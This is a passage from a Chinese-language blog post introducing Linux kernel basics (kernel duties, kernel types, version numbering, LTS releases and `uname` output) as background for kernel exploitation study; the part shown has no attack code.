<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="linux 内核概述 Linux 内核由 Linus Torvalds 于 1991 年开发，最初的目的是为 Intel 80386 处理器编写一个类 UNIX 系统的内核。当前版本的 Linux 内核由全球社区共同开发维护，通过 Git 管理源代码。 内核概述 内核（Kernel）是操作系统的核心部分，负责管理硬件资源并提供给用户程序使用。它充当硬件和应用程序之间的桥梁，是操作系统最基">
<meta property="og:type" content="article">
<meta property="og:title" content="linux kernel pwn 基础知识">
<meta property="og:url" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/index.html">
<meta property="og:site_name" content="sky123">
<meta property="og:description" content="linux 内核概述 Linux 内核由 Linus Torvalds 于 1991 年开发，最初的目的是为 Intel 80386 处理器编写一个类 UNIX 系统的内核。当前版本的 Linux 内核由全球社区共同开发维护，通过 Git 管理源代码。 内核概述 内核（Kernel）是操作系统的核心部分，负责管理硬件资源并提供给用户程序使用。它充当硬件和应用程序之间的桥梁，是操作系统最基">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/998ca0e31c4c3ed139bb7b1d1d05e3e4.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/c715813e764b9d971b01092ef652bac5.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/KPTI.drawio.svg">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/248d52bc78f674d3af4f30326f6a0d3f.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/b8339a49544b7c530101ae2730a11e59.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/3ee0687ee68d9de9d42881361d331098.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/0efc0cedf397c0dfec156cce07f576aa.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/05061c3e0eb8ab90b2b3f95cefd42fe9.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/3e3c2449e2a737aed1da834761c0d355.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/49fb3d6cbe9fed7e2280b4b4a6f20bad.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/b208933c9362745faccf49d8f545ae8d.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/a7b2a1a75b2154f05c6763d98d2c3eb7.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/80fbfc5452e6ee425f7676a492aef25a.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/8bced970f845702c22749e86041eda02.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/f7f490f6f668b542aab003ec27135ad2.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/244cd82a22db3cb5168651580d622465.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/df0e27a7cc01c0a1ab1b387409d7b8a4.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/3b2a9a9ff98bb492fa0cfef2dc1490f6.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/e9439ea41be5d91a1bc8789c50e098ff.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/06ab07e03d42cc6bd7f1079a157d0c6f.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/8ee336b6de8e8263a5dfa2dad69c99dc.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/11bad950de73843bef8e1716a85bdb0c.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/583c765a6df44d6ffd56e4f506174318.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/0dc462afb4eebcf420803eca2491f169.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/a7779218e2c579413905c3686109f346.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/c81b7db51c45c08b72566e44bb812f6e.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/44e4ba509ee764b224d3f4e294593b5e.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/024e56ed9b1dc15af106c1862c351ea6.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/fe05c4c5fd5262c0b74c90913c6ce22c.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/f2f96c222f1119bae1840b4b1ff095bf.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/c93f022e123582a73f61518d69b88fa2.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/51cb330151299d66bf3881b7aa81cc54.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/4474952c80dbb804309d2bc6a50287e4.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/45da6ddd31759a9cc29edb9e1fc2c575.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/f0b1c1b6aadf1eba53a3755458240f63.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/8032fcd09424f9f59736d97d9f23de25.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/0e45c44c3822f545cfa2067a616acf76.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/638d83d2f81585a9fec3f2f9c2e655d8.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/a4a9e1beefc8b080d8988819ab67e61a.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/d344b50a2b60fe8ed41cfd6e05923cd0.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/597ff6c86dbd147d99dcb311abf66cee.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/2076d182b0b38f6a5f47d225d016d4f7.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/e7b00cb989747e1f58362f34e2224339.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/a9b8f88b5a7e5d56fdee54ec2c45b3e1.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/3b6d522ba4619e691b4fb0cfcd591140.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/6369190069fbdb7c6d09f5af41267f25.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/71fe45733009242d8fdb603a12b1710d.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/10e0b8440708ff61cee73ed24699e64b.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/4e79d34af1408f9d75a62383a6f55081.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/8cb0bf19e0c73e4bb3bffe8239f07caa.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/56602153f7522e83bf5f7ac3f41d6ecf.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/a577482dda67724b83501acf6c9c1e47.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/c3827c08733ff1c1e483b68a7219a30c.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/2b833dffac355164909bec5817f96202.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/2d026a01540a830c1dc2709f61f097bd.png">
<meta property="article:published_time" content="2024-11-08T12:23:30.064Z">
<meta property="article:modified_time" content="2024-11-19T19:32:21.342Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="linux kernel pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/images/998ca0e31c4c3ed139bb7b1d1d05e3e4.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            linux kernel pwn 基础知识 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/build/css/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"9.3.0"}},"version":"2.8.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">25</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">linux kernel pwn 基础知识</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-08 20:23:30</span>
        <span class="mobile">2024-11-08 20:23:30</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-11-20 03:32:21</span>
            <span class="mobile">2024-11-20 03:32:21</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/pwn/">pwn</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/pwn/linux-kernel-pwn/">linux kernel pwn</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/linux-kernel-pwn/">linux kernel pwn</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>22.6k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>99 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="linux-内核概述">linux 内核概述</h1>
<p>Linux 内核由 Linus Torvalds 于 1991 年开发，最初的目的是为 Intel
80386 处理器编写一个类 UNIX 系统的内核。当前版本的 Linux
内核由全球社区共同开发维护，通过 Git 管理源代码。</p>
<h2 id="内核概述">内核概述</h2>
<p>内核（Kernel）是操作系统的核心部分，负责管理硬件资源并提供给用户程序使用。它充当硬件和应用程序之间的桥梁，是操作系统最基础和最关键的部分。</p>
<h3 id="内核的职责">内核的职责</h3>
<ul>
<li><p><strong>进程管理</strong>：</p>
<ul>
<li><p>负责调度 CPU，确保多个进程可以并发运行。</p></li>
<li><p>通过调度算法分配 CPU 时间片。</p></li>
<li><p>进程的创建、终止、状态切换和通信。</p></li>
</ul></li>
<li><p>内存管理：</p>
<ul>
<li>分配和释放内存，防止内存冲突。</li>
<li>提供虚拟内存支持，使每个进程有独立的地址空间。</li>
<li>管理分页（Paging）和分段（Segmentation）。</li>
</ul></li>
<li><p><strong>文件系统管理</strong>：</p>
<ul>
<li>提供文件读写接口。</li>
<li>管理存储设备（如硬盘）的文件组织和访问权限。</li>
<li>提供文件系统抽象层，支持多种文件系统（如 FAT32、NTFS、ext4）。</li>
</ul></li>
<li><p><strong>设备驱动管理</strong>：</p>
<ul>
<li>通过驱动程序控制硬件设备（如键盘、显示器、网卡）。</li>
<li>提供统一的设备访问接口。</li>
</ul></li>
<li><p><strong>网络管理</strong>：</p>
<ul>
<li>提供网络协议栈（如 TCP/IP）支持网络通信。</li>
<li>管理数据包发送、接收和路由。</li>
</ul></li>
<li><p><strong>安全和权限管理</strong>：</p>
<ul>
<li>用户权限隔离，防止进程间相互干扰。</li>
<li>控制资源访问权限，保障系统安全。</li>
</ul></li>
</ul>
<h3 id="内核的分类">内核的分类</h3>
<p><img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/998ca0e31c4c3ed139bb7b1d1d05e3e4.png"
                     
                      
                
                ></p>
<ul>
<li><strong>单体内核（Monolithic
Kernel）</strong>：所有的核心功能（如进程管理、内存管理、文件系统等）都在内核态运行。
<ul>
<li>优点：性能高，系统调用开销低。</li>
<li>缺点：模块之间耦合度高，出错影响整个系统。</li>
<li>示例：Linux、BSD。</li>
</ul></li>
<li><strong>微内核（Microkernel）</strong>：仅保留最基础功能（如进程管理、内存管理）在内核态，其他功能移到用户态。
<ul>
<li>优点：模块化设计，稳定性高。</li>
<li>缺点：性能低，系统调用开销大。</li>
<li>示例：Minix、QNX。</li>
</ul></li>
<li><strong>混合内核（Hybrid
Kernel）</strong>：结合单体内核和微内核的优点，将部分功能运行在内核态，部分功能在用户态。
<ul>
<li>示例：Windows NT、macOS。</li>
</ul></li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>Linux
内核属于单体内核，所有核心功能（如进程管理、内存管理、设备驱动、文件系统、网络协议栈等）都运行在内核态。相较于微内核，单体内核性能更高，但模块之间高度耦合可能导致稳定性问题。</p>

    </div>
  </div>
<h2 id="linux-内核的特点">Linux 内核的特点</h2>
<ul>
<li><strong>模块化设计</strong>：Linux 内核的模块（Kernel
Module）可以在运行时动态加载（<code>insmod</code>）或卸载（<code>rmmod</code>）。这使得开发人员无需重启系统或重新编译整个内核即可调试或扩展功能。</li>
<li><strong>高性能</strong>：
<ul>
<li><strong>任务调度优化</strong>：使用 <code>CFS</code>
调度器（完全公平调度器），实现低延迟和公平的任务分配。</li>
<li><strong>多核支持</strong>：充分利用多核架构，通过锁机制（如自旋锁、读写锁）实现高效并发。</li>
<li><strong>零拷贝机制</strong>：网络通信中采用零拷贝技术，减少内存复制，提高吞吐量。</li>
</ul></li>
<li><strong>可移植性</strong>：支持多种硬件架构（x86、ARM、RISC-V
等）。可裁剪内核以适配嵌入式设备，同时也支持大规模服务器的多线程与并发。</li>
<li><strong>开源性</strong>：Linux 内核使用 GPLv2
许可证，全球社区通过邮件列表和补丁贡献，推动内核发展，并且所有修改和发布的代码必须开源。</li>
<li><strong>强大网络支持</strong>：内核内置高性能的网络协议栈，支持
IPv4、IPv6、UDP、ICMP 等。支持现代网络协议（如
QUIC）、SDN（软件定义网络）和虚拟网络（如 VXLAN）。</li>
</ul>
<h2 id="linux-内核版本">Linux 内核版本</h2>
<p>Linux
内核版本是社区开发和维护的核心之一，用于标识不同阶段的功能、性能和稳定性。</p>
<h3 id="版本命名规则">版本命名规则</h3>
<p>Linux 内核版本号通常由三个或四个部分组成，格式为
<code>X.Y.Z</code>：</p>
<p><strong><code>X</code>（主版本号）</strong>：表示重大更新，例如架构变更或核心功能的大幅改进。例如：从
4.x 升级到 5.x。</p>
<p><strong><code>Y</code>（次版本号）</strong>：表示新功能和优化的引入。例如：5.10
中引入新的文件系统优化。</p>
<p><strong><code>Z</code>（修订号）</strong>：表示漏洞修复或小的改进。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>在 2.x 内核中，奇数表示开发版本，偶数表示稳定版本；从 3.x
开始废弃这种规则。</p>

    </div>
  </div>
<h3 id="版本的类型">版本的类型</h3>
<p>Linux 内核由社区主导开发，Linux 内核大约每 <strong>8-10
周</strong>发布一个新版本。每个版本的开发分为两个阶段：</p>
<ul>
<li><p><strong>合并窗口（Merge
Window）</strong>：开始时为期两周的功能合并窗口，开发者提交新功能和重大改进。结束后，停止接收新功能，只修复问题。</p></li>
<li><p><strong>修复阶段</strong>：剩下的时间用于 Bug
修复和代码优化。随着 RC（Release
Candidate，候选版本）的发布逐步接近稳定。</p></li>
</ul>
<p>内核版本在发布前会经历多个 RC 版本（<code>X.Y-rcN</code>），如
<code>5.15-rc3</code>。每个 RC
版本修复前一版本发现的问题，直到版本足够稳定。</p>
<p>一些特定版本由社区标记为 LTS，生命周期通常为 2-6
年，适合生产环境。</p>
<h3 id="当前活跃的内核版本">当前活跃的内核版本</h3>
<ul>
<li><strong>4.14</strong>：嵌入式设备常用，2017 年 11 月发布，支持至
2024 年。</li>
<li><strong>4.19</strong>：许多稳定性优化，2018 年 10 月发布，支持至
2024 年。</li>
<li><strong>5.4</strong>：企业环境常见，2019 年 11 月发布，支持至 2025
年。</li>
<li><strong>5.10</strong>：多场景支持，稳定，2020 年 12 月发布，支持至
2026 年。</li>
<li><strong>5.15</strong>：改进 <code>IO_uring</code> 和文件系统，2021
年 11 月发布，支持至 2028 年。</li>
<li><strong>6.x 系列</strong>：最新的长期支持版本。</li>
</ul>
<h3 id="查看系统版本">查看系统版本</h3>
<h4 id="uname-命令">uname 命令</h4>
<p><code>uname</code> 是一个标准命令，用于显示系统信息，其中
<code>-r</code>
参数用于显示当前运行的内核版本。如果想获取更详细的信息，可以使用
<code>uname</code> 的 <code>-a</code> 参数：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ <span class="built_in">uname</span> -r</span><br><span class="line">5.15.0-50-generic</span><br><span class="line">/ $ <span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntu 5.15.0-50-generic <span class="comment">#56~20.04.1-Ubuntu SMP Thu Sep 29 19:22:06 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li><p><code>Linux</code>：内核名称。</p></li>
<li><p><code>ubuntu</code>：主机名。</p></li>
<li><p><code>5.15.0-50-generic</code>：内核版本。</p>
<ul>
<li><p><code>5.15.0</code>：内核的主版本号和次版本号。</p></li>
<li><p><code>-50</code>：分配给当前内核版本的修订编号。</p>
<p><code>generic</code>：特定的内核类型，表示为通用内核。</p></li>
<li><p>其他可能的值：</p>
<ul>
<li><code>lowlatency</code>：低延迟内核。</li>
<li><code>rt</code>：实时内核。</li>
</ul></li>
</ul></li>
<li><p><code>#56~20.04.1-Ubuntu SMP Thu Sep 29 19:22:06 UTC 2022</code>：</p>
<ul>
